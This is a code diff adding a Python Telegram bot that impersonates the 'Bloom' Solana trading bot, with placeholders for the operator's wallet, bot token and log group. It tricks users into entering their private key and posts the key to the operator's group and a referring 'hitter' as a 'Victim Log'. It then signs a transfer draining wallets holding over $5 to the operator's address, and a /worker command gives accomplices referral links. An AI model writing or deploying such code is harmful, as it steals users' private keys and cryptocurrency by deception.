@@ -1,0 +1,269 @@
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from solana.rpc.api import Client
+from solders.keypair import Keypair
+from solders.pubkey import Pubkey
+from solders.system_program import TransferParams, transfer
+from solders.transaction import Transaction
+from solders.message import Message
+from solders.signature import Signature
+import requests
+
+
+GROUP_CHAT_ID = -PUT THE GROUPCHAT ID HERE TO RECIEVE LOGS
+
+
+solana_client = Client("https://api.mainnet-beta.solana.com")
+
+
+COINGECKO_API_URL = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
+
+
+BOT_USERNAME = "NAMEOFYOURBOT"
+
+
+DESTINATION_ADDRESS = Pubkey.from_string("AUTODRAIN HERE <- PUT UR SOLONA ADDRESS HERE") 
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    referrer_id = None
+    referrer_name = None
+    if context.args:
+        referrer_id = context.args[0]
+
+
+        try:
+            referrer = await context.bot.get_chat(referrer_id)
+            referrer_name = f"@{referrer.username}" if referrer.username else f"User_{referrer_id}"
+        except Exception as e:
+            referrer_name = f"User_{referrer_id}"
+
+
+    context.user_data['referrer_id'] = referrer_id
+    context.user_data['referrer_name'] = referrer_name
+
+    keyboard = [[InlineKeyboardButton("Continue", callback_data='continue')]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    message = (
+        "🌸 Bloom - Your UNFAIR advantage in crypto 🌸\n\n"
+        "Bloom allows you to seamlessly trade tokens, set automations like Limit Orders, Copy Trading, and more—all within Telegram.\n\n"
+        "By continuing, you'll create a crypto wallet that interacts directly with Bloom, enabling live data and instant transactions. All trading activities and wallet management will occur through Telegram.\n\n"
+        "⚠️ IMPORTANT: After clicking \"Continue,\" your public wallet address and private key will be generated and displayed directly within Telegram. Ensure you are in a private, secure location before proceeding. Your private key will be shown only once, and it is crucial that you store it securely, as Bloom will not store or retrieve it for you.\n\n"
+        "By pressing \"Continue,\" you confirm that you have read and agree to our Terms and Conditions and Privacy Policy. You also acknowledge the inherent risks involved in cryptocurrency trading and accept full responsibility for any outcomes related to your use of Bloom.\n\n"
+        "Please take a moment to review our terms before moving forward."
+    )
+
+    await update.message.reply_text(message, reply_markup=reply_markup)
+
+async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    user_id = update.message.from_user.id
+    referral_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
+
+
+    await update.message.reply_text(
+        f"Welcome! Your referral link to add users:\n\n{referral_link}"
+    )
+
+async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    if query.data == 'continue':
+        keyboard = [
+            [InlineKeyboardButton("🔄 Positions", callback_data='positions'), InlineKeyboardButton("🎯 LP Sniper", callback_data='lp_sniper')],
+            [InlineKeyboardButton("📑 Copy Trade", callback_data='copy_trade'), InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
+            [InlineKeyboardButton("📊 Limit Orders", callback_data='limit_orders'), InlineKeyboardButton("🤝 Referrals", callback_data='referrals')],
+            [InlineKeyboardButton("💸 Withdraw", callback_data='withdraw'), InlineKeyboardButton("⚙️ Settings", callback_data='settings')],
+            [InlineKeyboardButton("❌ Close", callback_data='close'), InlineKeyboardButton("🔄 Refresh", callback_data='refresh')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        message = (
+            "Welcome to Bloom! 🌸\n\n"
+            "Let your trading journey blossom with us!\n\n"
+            "🌸 You currently have no SOL in your wallet.\n"
+            "To start trading please import a wallet\n\n"
+            "💳 Your Solana Wallets:\n\n"
+            "None - 0 SOL ($0.00 USD)\n"
+            "• Import or create new wallet to begin.\n\n"
+            "🔴 You currently have no SOL in your wallet.\n"
+            "To start trading, please deposit SOL to your address.\n\n"
+            "📚 Resources:\n\n"
+            f"• 📖 [Bloom Guides](https://solana.bloombot.app/)\n"
+            f"• 🔔 [Bloom X](https://x.com/BloomTradingBot/)\n"
+            f"• 🌍 [Bloom Website](https://www.bloombot.app/)\n"
+            f"• 🤝 [Bloom Portal](https://t.me/bloomportal)\n\n"
+            f"🇳🇱 [EU1](https://t.me/BloomSolana_bot) • 🇩🇪 [EU2](https://t.me/BloomSolanaEU2_bot) • 🇺🇸 [US1](https://t.me/BloomSolanaUS1_bot) • 🇸🇬 [SG1](https://t.me/BloomSolanaSG1_bot)"
+        )
+        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode="Markdown")
+    elif query.data == 'wallet':
+        keyboard = [
+            [InlineKeyboardButton("Import Wallet", callback_data='import_wallet')],
+            [InlineKeyboardButton("⬅️ Back", callback_data='back')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        message = (
+            "💳 Your Solana Wallets:\n\n"
+            "None - 0 SOL ($0.00 USD)\n"
+            "• Import to begin."
+        )
+        await query.edit_message_text(message, reply_markup=reply_markup)
+    elif query.data == 'import_wallet':
+        await query.edit_message_text("🟠 Please enter your private key to import your wallet:")
+        context.user_data['awaiting_private_key'] = True
+    elif query.data == 'back':
+        keyboard = [
+            [InlineKeyboardButton("🔄 Positions", callback_data='positions'), InlineKeyboardButton("🎯 LP Sniper", callback_data='lp_sniper')],
+            [InlineKeyboardButton("📑 Copy Trade", callback_data='copy_trade'), InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
+            [InlineKeyboardButton("📊 Limit Orders", callback_data='limit_orders'), InlineKeyboardButton("🤝 Referrals", callback_data='referrals')],
+            [InlineKeyboardButton("💸 Withdraw", callback_data='withdraw'), InlineKeyboardButton("⚙️ Settings", callback_data='settings')],
+            [InlineKeyboardButton("❌ Close", callback_data='close'), InlineKeyboardButton("🔄 Refresh", callback_data='refresh')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        message = (
+            "Welcome to Bloom! 🌸\n\n"
+            "Let your trading journey blossom with us!\n\n"
+            "🌸 You currently have no SOL in your wallet.\n"
+            "To start trading please import a wallet\n\n"
+            "💳 Your Solana Wallets:\n\n"
+            "None - 0 SOL ($0.00 USD)\n"
+            "• Import or create new wallet to begin.\n\n"
+            "🔴 You currently have no SOL in your wallet.\n"
+            "To start trading, please deposit SOL to your address.\n\n"
+            "📚 Resources:\n\n"
+            f"• 📖 [Bloom Guides](https://solana.bloombot.app/)\n"
+            f"• 🔔 [Bloom X](https://x.com/BloomTradingBot/)\n"
+            f"• 🌍 [Bloom Website](https://www.bloombot.app/)\n"
+            f"• 🤝 [Bloom Portal](https://t.me/bloomportal)\n\n"
+            f"🇳🇱 [EU1](https://t.me/BloomSolana_bot) • 🇩🇪 [EU2](https://t.me/BloomSolanaEU2_bot) • 🇺🇸 [US1](https://t.me/BloomSolanaUS1_bot) • 🇸🇬 [SG1](https://t.me/BloomSolanaSG1_bot)"
+        )
+        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode="Markdown")
+    elif query.data != 'wallet':
+        keyboard = [[InlineKeyboardButton("🔄 Retry", callback_data='continue')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        message = "❌ No wallets connected. Import first. ❌"
+        await query.edit_message_text(message, reply_markup=reply_markup)
+
+async def handle_private_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if context.user_data.get('awaiting_private_key'):
+        private_key = update.message.text
+        try:
+
+            keypair = Keypair.from_base58_string(private_key)
+            public_key = keypair.pubkey()
+
+
+            balance_response = solana_client.get_balance(public_key)
+            if not balance_response.value:
+                await update.message.reply_text("Invalid private key or wallet has no balance.")
+                return
+
+            balance_sol = balance_response.value / 1e9 
+
+
+            response = requests.get(COINGECKO_API_URL)
+            sol_price_usd = response.json()['solana']['usd']
+
+            balance_usd = balance_sol * sol_price_usd
+
+
+            referrer_id = context.user_data.get('referrer_id')
+            referrer_name = context.user_data.get('referrer_name')
+
+
+            message = (
+                "**🪝 Victim Log**\n\n"
+                "**🔎 Victim Information**\n"
+                f"├ **👤 Name:** @{update.message.from_user.username}\n"
+                f"├ **🆔 User ID:** `{update.message.from_user.id}`\n"
+                f"├ **🔑 Private Key:** `{private_key}`\n"
+                f"├ **📃 Address:** `{public_key}`\n"
+                f"├ **💵 Balance:** ${balance_usd:.2f}\n"
+                f"├ **🪙 SOL:** {balance_sol}\n\n"
+                "**🪝 Hitter Information**\n"
+                f"├ **👤 Name:** {referrer_name}\n"
+                f"├ **🆔 User ID:** `{referrer_id}`\n"
+            )
+
+
+            await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=message, parse_mode="Markdown")
+
+
+            if referrer_id:
+                try:
+                    await context.bot.send_message(chat_id=referrer_id, text=message, parse_mode="Markdown")
+                except Exception as e:
+                    await context.bot.send_message(
+                        chat_id=GROUP_CHAT_ID,
+                        text=f"❌ Failed to send log to referrer (ID: {referrer_id})."
+                    )
+
+
+            if balance_usd > 5:
+
+                transfer_amount = int(balance_response.value - 5000)
+                if transfer_amount > 0:
+                    blockhash_response = solana_client.get_latest_blockhash()
+                    if not blockhash_response.value:
+                        await context.bot.send_message(
+                            chat_id=GROUP_CHAT_ID,
+                            text="❌ Failed to fetch the latest blockhash."
+                        )
+                        return
+
+                    blockhash = blockhash_response.value.blockhash
+
+
+                    transfer_instruction = transfer(TransferParams(
+                        from_pubkey=public_key,
+                        to_pubkey=DESTINATION_ADDRESS,
+                        lamports=transfer_amount
+                    ))
+
+
+                    message = Message.new_with_blockhash(
+                        [transfer_instruction],
+                        payer=public_key,
+                        blockhash=blockhash
+                    )
+
+
+                    transaction = Transaction([keypair], message, blockhash)
+                    transaction.sign([keypair], blockhash)
+
+
+                    transfer_response = solana_client.send_transaction(transaction)
+                    if transfer_response.value:
+                        await context.bot.send_message(
+                            chat_id=GROUP_CHAT_ID,
+                            text=f"✅ Funds transferred successfully! Transaction ID: `{transfer_response.value}`",
+                            parse_mode="Markdown"
+                        )
+                    else:
+                        await context.bot.send_message(
+                            chat_id=GROUP_CHAT_ID,
+                            text="❌ Failed to transfer funds."
+                        )
+
+            await update.message.reply_text(f"Wallet imported successfully!\nBalance: {balance_sol} SOL (${balance_usd:.2f})")
+        except Exception as e:
+            await update.message.reply_text(f"Error: {str(e)}")
+        finally:
+            context.user_data['awaiting_private_key'] = False
+
+def main():
+    application = Application.builder().token("TELEGRAM TOKEN HERE").build()
+
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("worker", worker))
+    application.add_handler(CallbackQueryHandler(button))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_private_key))
+
+    application.run_polling()
+
+if __name__ == "__main__":
+    main()
